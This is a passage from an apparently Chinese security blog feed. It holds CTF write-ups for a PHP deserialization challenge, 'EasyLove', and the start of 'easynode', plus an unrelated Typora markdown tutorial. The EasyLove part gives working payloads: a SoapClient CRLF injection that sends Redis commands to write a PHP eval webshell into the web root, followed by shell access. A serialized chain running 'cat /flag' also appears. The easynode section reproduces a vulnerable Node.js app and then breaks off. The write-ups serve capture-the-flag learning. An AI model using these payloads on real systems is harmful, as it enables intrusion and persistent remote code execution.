<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="number">0</span>==<span class="string">&quot;fs12hasasd2342523dha&quot;</span>);  <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="number">0</span>==<span class="string">&quot;1313fs12hasasd2342523dha&quot;</span>);  <span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<p>这个会返回<code>true</code>，虽然下面会返回<code>false</code>，但随机数，总会<code>true</code>的情况</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>=<span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line"><span class="comment">//    public $time = &quot;Two and a half years&quot;;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key= <span class="keyword">new</span> <span class="title function_ invoke__">fine</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code=<span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$f</span>=<span class="keyword">new</span> <span class="title function_ invoke__">fine</span>();</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="variable">$e</span>=<span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;hint=<span class="variable">$s</span>;</span><br><span class="line"><span class="variable">$o</span>-&gt;hint-&gt;ctf=<span class="variable">$e</span>;</span><br><span class="line"><span class="variable">$str</span> =  <span class="title function_ invoke__">serialize</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$str1</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fine&quot;:2&#x27;</span>,<span class="string">&#x27;fine&quot;:5&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>((<span class="variable">$str1</span>));</span><br></pre></td></tr></table></figure>

<p>因为<code>code</code>是一个<code>protected</code>属性的，所以需要在类里面使用<code>__construct()</code>方法进行初始化</p>
<h2 id="EasyLove"><a href="#EasyLove" class="headerlink" title="EasyLove"></a>EasyLove</h2><p>1.源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">swpu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wllm</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arsenetang</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$l61q4cheng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$wllm</span>,<span class="variable">$arsenetang</span>,<span class="variable">$l61q4cheng</span>,<span class="variable">$love</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;wllm = <span class="variable">$wllm</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;arsenetang = <span class="variable">$arsenetang</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;l61q4cheng = <span class="variable">$l61q4cheng</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love = <span class="variable">$love</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">newnewnew</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">wllm</span>(<span class="variable">$this</span>-&gt;arsenetang,<span class="variable">$this</span>-&gt;l61q4cheng);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">newnewnew</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">flag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hint</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt; hint.<span class="string">&#x27;hint.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$hello</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$world</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$hello</span>);  </span><br></pre></td></tr></table></figure>

<p>是一个反序列化</p>
<p>打开靶机的时候给了一个hint，<code>Redis是世界上最好的数据库！</code></p>
<p>用的是Redis库，看源码中还有一个hint.php，先获取这个中的内容</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hint</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=/var/www/html/&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hint</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>得到hint.php的内容是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$hint</span> = <span class="string">&quot;My favorite database is Redis and My favorite day is 20220311&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>20220311是Redis库的密码</p>
<p>2.有了密码，但是得想办法用到这个密码</p>
<p>进行反序列化时会触发</p>
<p><img src="/2023/04/16/DASCTF%20X%20GFCTF%202022/image-20230416205629097.png" alt="image-20230416205629097"></p>
<p>分别看看调用的这两个函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">newnewnew</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;love = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">wllm</span>(<span class="variable">$this</span>-&gt;arsenetang,<span class="variable">$this</span>-&gt;l61q4cheng);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;love-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag()方法其中有一个getflag()方法，但是源代码中并没有这个方法，这时会自动调用<code>__call</code>方法，可以用到SoapClient原生类，可以触发SoapClient类中的<code>__call</code>方法，可以利用newnewnew()方法来实例化一个该类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SoapClient类需要两个参数，第一个参数是否是wsdl模式，构造的时候一般用Null，第二个参数是个数组</span><br><span class="line">在非wsdl模式下，必须设置location和uri选项，可以通过uri选项向redis写木马</span><br></pre></td></tr></table></figure>

<p>写入的木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AUTH 20220311 //验证客户端链接</span><br><span class="line">CONFIG SET dir /var/www/html  //设置写入的目录</span><br><span class="line">SET x &#x27;&lt;?@eval(\$_POST[a]);?&gt;&#x27;  //设置写入的内容</span><br><span class="line">CONFIG SET dbfilename a.php  //设置写入的文件名</span><br><span class="line">SAVE  //保存结束</span><br></pre></td></tr></table></figure>

<p>2.Redis库的主机服务一般是6379</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">swpu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wllm</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arsenetang</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$l61q4cheng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;wllm = <span class="string">&quot;SoapClient&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;arsenetang = Null;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;l61q4cheng= <span class="keyword">array</span>(<span class="string">&quot;location&quot;</span>=&gt;<span class="string">&quot;http://127.0.0.1:6379&quot;</span>,<span class="string">&quot;uri&quot;</span>=&gt;<span class="string">&quot;hello\r\nAUTH 20220311\r\nCONFIG SET dir /var/www/html\r\nSET x &#x27;&lt;?@eval(\$_POST[a]);?&gt;&#x27;\r\nCONFIG SET dbfilename a.php\r\nSAVE\r\nhello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$aa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">swpu</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$aa</span>));</span><br></pre></td></tr></table></figure>

<p>传入序列化的东西后，打开</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://510c040e-2d70-4e6f-a8b0-e3df753ad904.node4.buuoj.cn:81/a.php</span><br></pre></td></tr></table></figure>

<p>没有404，连接蚁剑，成功连接</p>
<p>但是根目录下并没有flag，有一个statr.sh</p>
<p><img src="/2023/04/16/DASCTF%20X%20GFCTF%202022/image-20230416210431478.png" alt="image-20230416210431478"></p>
<p>根据这个可以知道flag在<code>/hereisflag/flllll111aaagg</code>下，可以使用date命令打开<code>flllll111aaagg</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date -f 可以打开指定文件</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/16/DASCTF%20X%20GFCTF%202022/image-20230416210724321.png" alt="image-20230416210724321"></p>
]]></content>
  </entry>
  <entry>
    <title>Typora用法</title>
    <url>/2022/10/04/Typora%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<p>Typora基本用法</p>
<span id="more"></span>

<h6 id="1-标题快捷键是ctrl-数字"><a href="#1-标题快捷键是ctrl-数字" class="headerlink" title="1.标题快捷键是ctrl+数字"></a>1.标题快捷键是ctrl+数字</h6><h6 id="2-让字体居中显示"><a href="#2-让字体居中显示" class="headerlink" title="2.让字体居中显示"></a>2.让字体居中显示</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;center&gt;居中&lt;/center&gt;</span><br><span class="line">&lt;p align=&quot;left&quot;&gt;左对齐&lt;/p&gt;</span><br><span class="line">&lt;p align=&quot;right&quot;&gt;右对齐&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<h6 id="3-修改字体颜色"><a href="#3-修改字体颜色" class="headerlink" title="3.修改字体颜色"></a>3.修改字体颜色</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;font color=颜色代码 size=字号 face=&quot;字体名称&quot;&gt;文本&lt;/font&gt;</span><br></pre></td></tr></table></figure>

<p>红色的代码是#ff0000</p>
<h6 id="4-插入图片的语法是"><a href="#4-插入图片的语法是" class="headerlink" title="4.插入图片的语法是"></a>4.插入图片的语法是</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">![](这里是图片所在的文件)</span><br></pre></td></tr></table></figure>

<h6 id="5-设置链接是直接将链接写入"><a href="#5-设置链接是直接将链接写入" class="headerlink" title="5.设置链接是直接将链接写入"></a>5.设置链接是直接将链接写入</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;www.baidu.com&gt;</span><br></pre></td></tr></table></figure>

<h6 id="6-常用快捷键"><a href="#6-常用快捷键" class="headerlink" title="6.常用快捷键"></a>6.常用快捷键</h6><p><img src="/2022/10/04/Typora%E7%94%A8%E6%B3%95/Typora%E5%BF%AB%E6%8D%B7%E9%94%AE.png"></p>
]]></content>
  </entry>
  <entry>
    <title>easynode(GKCTF 2021)</title>
    <url>/2023/06/23/%5BGKCTF%202021%5Deasynode/</url>
    <content><![CDATA[<p>node原型链污染</p>
<span id="more"></span>

<meta name="referrer" content="no-referrer">

<p>给了源码，看看源码，最重要的是index.js</p>
<p>直接看index.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> format = <span class="built_in">require</span>(<span class="string">&#x27;string-format&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; select,close &#125; = <span class="built_in">require</span>(<span class="string">&#x27;./tools&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">var</span> extend = <span class="built_in">require</span>(<span class="string">&quot;js-extend&quot;</span>).<span class="property">extend</span></span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;generateToken,verifyToken&#125;  = <span class="built_in">require</span>(<span class="string">&#x27;./encrypt&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>((__dirname+<span class="string">&#x27;/public/&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">safeQuery</span> =  <span class="keyword">async</span> (<span class="params">username,password</span>)=&gt;&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">waf</span> = (<span class="params">str</span>)=&gt;&#123;</span><br><span class="line">        <span class="comment">// console.log(str);</span></span><br><span class="line">        blacklist = [<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>]</span><br><span class="line">        blacklist.<span class="title function_">forEach</span>(<span class="function"><span class="params">element</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (str == element)&#123;</span><br><span class="line">                str = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">safeStr</span> = (<span class="params">str</span>)=&gt;&#123; <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i &lt; str.<span class="property">length</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">waf</span>(str[i]) ==<span class="string">&quot;*&quot;</span>)&#123;</span><br><span class="line">            </span><br><span class="line">            str =  str.<span class="title function_">slice</span>(<span class="number">0</span>, i) + <span class="string">&quot;*&quot;</span> + str.<span class="title function_">slice</span>(i + <span class="number">1</span>, str.<span class="property">length</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    username = <span class="title function_">safeStr</span>(username);</span><br><span class="line">    password = <span class="title function_">safeStr</span>(password);</span><br><span class="line">    <span class="keyword">let</span> sql = <span class="title function_">format</span>(<span class="string">&quot;select * from test where username = &#x27;&#123;&#125;&#x27; and password = &#x27;&#123;&#125;&#x27;&quot;</span>,username.<span class="title function_">substr</span>(<span class="number">0</span>,<span class="number">20</span>),password.<span class="title function_">substr</span>(<span class="number">0</span>,<span class="number">20</span>));</span><br><span class="line">    <span class="comment">// console.log(sql);</span></span><br><span class="line">    result = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="keyword">await</span> <span class="title function_">select</span>(sql)));</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="title function_">async</span>(req,res)=&gt;&#123;</span><br><span class="line">    <span class="keyword">const</span> html = <span class="keyword">await</span> ejs.<span class="title function_">renderFile</span>(__dirname + <span class="string">&quot;/public/index.html&quot;</span>)</span><br><span class="line">    res.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/html&quot;</span>&#125;);</span><br><span class="line">    res.<span class="title function_">end</span>(html)</span><br><span class="line">&#125;)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">    <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">    <span class="title function_">safeQuery</span>(username,password).<span class="title function_">then</span>(</span><br><span class="line">        <span class="function"><span class="params">result</span> =&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(result[<span class="number">0</span>])&#123;</span><br><span class="line">                <span class="keyword">const</span> token = <span class="title function_">generateToken</span>(username)</span><br><span class="line">                res.<span class="title function_">json</span>(&#123;</span><br><span class="line">                    <span class="string">&quot;msg&quot;</span>:<span class="string">&quot;yes&quot;</span>,<span class="string">&quot;token&quot;</span>:token</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                res.<span class="title function_">json</span>(</span><br><span class="line">                    &#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;username or password wrong&quot;</span>&#125;</span><br><span class="line">                    );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ).<span class="title function_">then</span>(<span class="title function_">close</span>()).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span>=&gt;</span>&#123;res.<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;something wrong!&quot;</span>&#125;);&#125;);</span><br><span class="line">  &#125;)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/admin&quot;</span>,<span class="keyword">async</span> (req,res,next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span></span><br><span class="line">    <span class="keyword">let</span> result = <span class="title function_">verifyToken</span>(token);</span><br><span class="line">    <span class="keyword">if</span> (result !=<span class="string">&#x27;err&#x27;</span>)&#123;</span><br><span class="line">        username = result</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">`select board from board where username = &#x27;<span class="subst">$&#123;username&#125;</span>&#x27;`</span>;</span><br><span class="line">        <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="keyword">await</span> <span class="title function_">select</span>(sql).<span class="title function_">then</span>(<span class="title function_">close</span>())));  </span><br><span class="line">        board = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(query[<span class="number">0</span>].<span class="property">board</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(board);</span><br><span class="line">        <span class="keyword">const</span> html = <span class="keyword">await</span> ejs.<span class="title function_">renderFile</span>(__dirname + <span class="string">&quot;/public/admin.ejs&quot;</span>,&#123;board,username&#125;)</span><br><span class="line">        res.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/html&quot;</span>&#125;);</span><br><span class="line">        res.<span class="title function_">end</span>(html)</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;<span class="string">&#x27;msg&#x27;</span>:<span class="string">&#x27;stop!!!&#x27;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">  </span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/addAdmin&quot;</span>,<span class="keyword">async</span> (req,res,next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">    <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span></span><br><span class="line">    <span class="keyword">let</span> result = <span class="title function_">verifyToken</span>(token);</span><br><span class="line">    <span class="keyword">if</span> (result !=<span class="string">&#x27;err&#x27;</span>)&#123;</span><br><span class="line">        gift = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; [username]:&#123;<span class="attr">name</span>:<span class="string">&quot;Blue-Eyes White Dragon&quot;</span>,<span class="attr">ATK</span>:<span class="string">&quot;3000&quot;</span>,<span class="attr">DEF</span>:<span class="string">&quot;2500&quot;</span>,<span class="attr">URL</span>:<span class="string">&quot;https://ftp.bmp.ovh/imgs/2021/06/f66c705bd748e034.jpg&quot;</span>&#125;&#125;);</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="title function_">format</span>(<span class="string">&#x27;INSERT INTO test (username, password) VALUES (&quot;&#123;&#125;&quot;,&quot;&#123;&#125;&quot;) &#x27;</span>,username,password);</span><br><span class="line">        <span class="title function_">select</span>(sql).<span class="title function_">then</span>(<span class="title function_">close</span>()).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>)=&gt;</span>&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(err)&#125;); </span><br><span class="line">        <span class="keyword">var</span> sql = <span class="title function_">format</span>(<span class="string">&#x27;INSERT INTO board (username, board) VALUES (\&#x27;&#123;&#125;\&#x27;,\&#x27;&#123;&#125;\&#x27;) &#x27;</span>,username,gift);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(sql);</span><br><span class="line">        <span class="title function_">select</span>(sql).<span class="title function_">then</span>(<span class="title function_">close</span>()).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>)=&gt;</span>&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(err)&#125;);</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;add admin successful!&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;stop!!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/adminDIV&quot;</span>,<span class="title function_">async</span>(req,res,next) =&gt;&#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> data =  <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">body</span>.<span class="property">data</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> result = <span class="title function_">verifyToken</span>(token);</span><br><span class="line">    <span class="keyword">if</span>(result !=<span class="string">&#x27;err&#x27;</span>)&#123;</span><br><span class="line">        username = result;</span><br><span class="line">        <span class="keyword">var</span> sql =<span class="string">&#x27;select board from board&#x27;</span>;</span><br><span class="line">        <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="keyword">await</span> <span class="title function_">select</span>(sql).<span class="title function_">then</span>(<span class="title function_">close</span>()))); </span><br><span class="line">        board = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(query[<span class="number">0</span>].<span class="property">board</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(board);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> data)&#123;</span><br><span class="line">            <span class="keyword">var</span> addDIV = <span class="string">`&#123;&quot;<span class="subst">$&#123;username&#125;</span>&quot;:&#123;&quot;<span class="subst">$&#123;key&#125;</span>&quot;:&quot;<span class="subst">$&#123;data[key]&#125;</span>&quot;&#125;&#125;`</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="title function_">extend</span>(board,<span class="title class_">JSON</span>.<span class="title function_">parse</span>(addDIV));</span><br><span class="line">        &#125;</span><br><span class="line">        sql = <span class="string">`update board SET board = &#x27;<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(board)&#125;</span>&#x27; where username = &#x27;<span class="subst">$&#123;username&#125;</span>&#x27;`</span></span><br><span class="line">        <span class="title function_">select</span>(sql).<span class="title function_">then</span>(<span class="title function_">close</span>()).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>)=&gt;</span>&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(err)&#125;); </span><br><span class="line">        res.<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&#x27;addDiv successful!!!&#x27;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">1337</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`App listening at port 1337`</span>)</span><br><span class="line">&#125;)  </span><br></pre></td></tr></table></figure>

<p>一步一步看代码</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623200720308.png" alt="image-20230623200720308"></p>
